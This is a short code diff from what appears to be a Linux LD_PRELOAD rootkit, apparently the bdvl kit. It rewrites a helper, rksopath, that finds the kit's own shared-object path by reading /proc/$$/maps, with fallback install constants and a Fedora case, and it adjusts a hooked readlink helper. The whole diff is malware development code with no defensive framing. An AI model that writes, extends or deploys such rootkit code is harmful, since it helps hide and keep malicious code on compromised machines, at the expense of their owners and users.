@@ -24,12 +24,36 @@ int isfedora(void){
     return fedora;
 }
 
+/* returns the full sopath for the kit.
+ * if pointers installdir & bdvlso are NULL, the path is read from /proc/$$/maps.
+ * if the path cannot be found, INSTALL_DIR & BDVLSO are used as fallbacks.
+ * otherwise if installdir & bdvlso are not NULL, they are used. (i.e. at installation)
+ * if box is fedora, .$PLATFORM is not included in the result. */
 char *rksopath(char *installdir, char *bdvlso){
-    size_t pathsize=strlen(installdir)+strlen(bdvlso)+13;
-    char *ret = malloc(pathsize);
+    char *rkpath, *rkpathdup, *p, *ret, tmp[2048];
+    memset(tmp, 0, sizeof(tmp));
+
+    if(installdir == NULL && bdvlso == NULL){
+        rkpath = resolvelibpath();
+        if(rkpath != NULL){
+            rkpathdup = strdup(rkpath);
+            p = strrchr(rkpathdup, '.')+1;
+            if(!strcmp("x86_64\0", p)) rkpath[strlen(rkpath)-7]='\0';
+            else rkpath[strlen(rkpath)-4]='\0';
+
+            strncpy(tmp, rkpath, sizeof(tmp)-1);
+            strcat(tmp, ".$PLATFORM");
+            tmp[strlen(rkpath)+10]='\0';
+
+            free(rkpathdup);
+            free(rkpath);
+        }else snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", INSTALL_DIR, BDVLSO);
+    }else snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", installdir, bdvlso);
+
+    size_t pathsize = strlen(tmp)+1;
+    ret = malloc(pathsize);
     if(!ret) return NULL;
-    memset(ret, 0, pathsize);
-    snprintf(ret, pathsize, "%s/%s.$PLATFORM", installdir, bdvlso);
+    strncpy(ret, tmp, pathsize);
     if(isfedora()) ret[strlen(ret)-10]='\0';
     return ret;
 }
@@ -46,7 +70,7 @@ char *gdirname(int fd){
     readlink_status = (long)call(CREADLINK, path, filename, PATH_MAX);
     if(readlink_status < 0){
         free(filename);
-        return NULL;
+        filename = NULL;
     }
     return filename;
 }
